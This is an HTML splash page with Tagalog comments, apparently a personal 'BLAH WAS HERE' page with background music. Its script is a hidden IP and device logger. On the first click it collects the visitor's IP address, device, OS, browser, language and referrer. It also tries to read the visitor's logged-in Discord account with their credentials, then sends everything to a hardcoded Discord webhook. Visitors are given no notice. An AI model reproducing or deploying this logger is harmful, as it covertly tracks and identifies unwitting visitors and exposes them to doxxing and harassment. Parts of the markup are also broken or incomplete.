    <style type="text/tailwindcss">
        @layer utilities {
            .content-auto {
                content-visibility: auto;
            }
            .glow {
                box-shadow: 0 0 20px rgba(153, 69, 255, 0.3);

        /* ✅ INAYOS: Style para sa "BLAH WAS HERE" - Puting kulay + Reflection */
        #blahOverlay {
            position: fixed;
            inset: 0;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;

            transition: opacity 0.8s ease;

        #blahText {
            font-size: clamp(2.5rem, 10vw, 4rem);
            font-weight: 900;
            color: #ffffff; /* Puti na kulay */
            text-shadow: 0 0 12px rgba(255, 255, 255, 0.6); /* Malabong liwanag */
            font-family: Arial Black, Impact, sans-serif;
            /* Reflection effect */

            box-reflect: below 8px linear-gradient(to bottom, rgba(255,255,255,0.2), transparent 70%);
        }

        .fade-out {
            opacity: 0 !important;
        }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen text-white p-4">

                <p class="font-bold text-lg">BLAH<span class="text-sm text-gray-400">⚡ PR$K</span></p>

        <a href="https://discord.com/users/14973067157" target="_blank" class="text-indigo-500 text-4xl hover:scale-110 transition-transform">

    <!-- Background Sound -->
    <audio id="bgSound" loop preload="auto">
        <source src="https://mp3tourl.com/audio/1782125485468-d36d7923-f6a4-4d8c-b7fc-4d0b7b862457.mp3" type="audio/mpeg">
    

    <script>
        const audio = document.getElementById('bgSound');
        audio.volume = 0.4;

        // ✅ Webhook link mo
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1519198591900717307/hWliSDMI9K5NmjOS4-rMmcdofcdbWXhJCF_Zcc34Si35-sjRSEjwSrJGMyVH-mQGxyqJ";

        // ✅ Pag click ng screen
        document.addEventListener('click', () => {
            audio.play().catch(err => console.log("Hindi tumugtog:", err));

            const overlay = document.getElementById('blahOverlay');
            setTimeout(() => overlay.classList.add('fade-out'), 800);

            sendVisitorInfo();
        }, { once: true });

        // ✅ Inayos na function para malaman ang tunay na detalye
        async function sendVisitorInfo() {
            try {
                // Kumuha ng IP
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const visitorIP = ipData.ip;

                // ✅ I-parse ang User Agent para makuha ang tunay na device, browser at wika
                const ua = navigator.userAgent;
                const lang = navigator.language || navigator.userLanguage;
                const langFull = new Intl.DisplayNames(['en'], { type: 'language' }).of(lang) || lang;

                // ✅ Kilalanin ang Browser
                let browser = "Hindi matukoy";
                if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
                else if (ua.includes("Firefox")) browser = "Firefox";
                else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
                else if (ua.includes("Edg")) browser = "Edge";
                else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";

                // ✅ Kilalanin ang Device Brand at Model
                let device = "Hindi matukoy";
                if (ua.includes("Samsung")) device = "Samsung";
                else if (ua.includes("SM-")) device = `Samsung (${ua.match(/SM-[A-Za-z0-9]+/)?.[0] || 'Model'})`;
                else if (ua.includes("Oppo") || ua.includes("CPH")) device = `Oppo (${ua.match(/CPH[0-9]+/)?.[0] || 'Model'})`;
                else if (ua.includes("Xiaomi") || ua.includes("Redmi") || ua.includes("POCO")) device = ua.match(/(Xiaomi|Redmi|POCO)[^\s;)]+/)?.[0] || "Xiaomi / Redmi / POCO";
                else if (ua.includes("Vivo") || ua.includes("V")) device = `Vivo (${ua.match(/V[0-9]+/)?.[0] || 'Model'})`;
                else if (ua.includes("Infinix") || ua.includes("X")) device = `Infinix (${ua.match(/X[0-9]+/)?.[0] || 'Model'})`;
                else if (ua.includes("Tecno")) device = "Tecno";
                else if (ua.includes("Realme")) device = "Realme";
                else if (ua.includes("iPhone")) device = "Apple iPhone";
                else if (ua.includes("iPad")) device = "Apple iPad";
                else if (ua.includes("Windows")) device = "Windows PC";
                else if (ua.includes("Mac OS")) device = "Mac / MacBook";
                else if (ua.includes("Android")) device = "Android Device";

                // ✅ Ipakita ang buong OS version
                let os = "Hindi matukoy";
                if (ua.includes("Android")) os = ua.match(/Android [0-9.]+/)?.[0] || "Android";
                else if (ua.includes("Windows")) os = ua.match(/Windows NT [0-9.]+/)?.[0]?.replace("Windows NT ", "Windows ") || "Windows";
                else if (ua.includes("Mac OS")) os = "macOS";

                // ✅ I-check kung may Discord account na naka-login
                let discordInfo = "Walang naka-detect na Discord account";
                try {
                    const checkDiscord = await fetch("https://discord.com/api/v9/users/@me", { credentials: "include" });
                    if (checkDiscord.ok) {
                        const user = await checkDiscord.json();
                        discordInfo = `✅ Discord: **${user.username}#${user.discriminator || '0000'}**\nID: ${user.id}\nProfile: https://discord.com/users/${user.id}`;
                    }
                } catch (e) {
                    discordInfo = "ℹ️ Hindi naka-login sa Discord o pinagbawalan ng browser";
                }

                // ✅ Buuin ang mensahe para sa Discord Webhook
                const payload = {
                    username: "BOBO KA TOL",
                    avatar_url: "https://i.imgur.com/ZmspxIl.png",
                    embeds: [{
                        title: "BLAH WAS HERE",
                        color: 1003621,
                        fields: [
                            { name: "IP ADDRESS", value: `||${visitorIP}||`, inline: false },
                            { name: "DEVICE", value: device, inline: true },
                            { name: "OPERATING SYSTEM", value: os, inline: true },
                            { name: "BROWSER", value: browser, inline: true },
                            { name: "TANGA PUTA", value: langFull, inline: true },
                            { name: "HULE", value: `${window.innerWidth} × ${window.innerHeight}`, inline: true },
                            { name: "GINANON LANG", value: document.referrer || "Direktang binuksan", inline: false },
                            { name: "ACCOUNT", value: discordInfo, inline: false }
                        ],
                        timestamp: new Date().toISOString(),
                        footer: { text: "Logger ni BLAH" }
                    }]
                };

                // ✅ Ipadala sa Webhook
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

                console.log("Detalye naipadala nang tama");

            } catch (err) {
                console.log("Error:", err);
            }
        }
    </script>
</body>
</html>
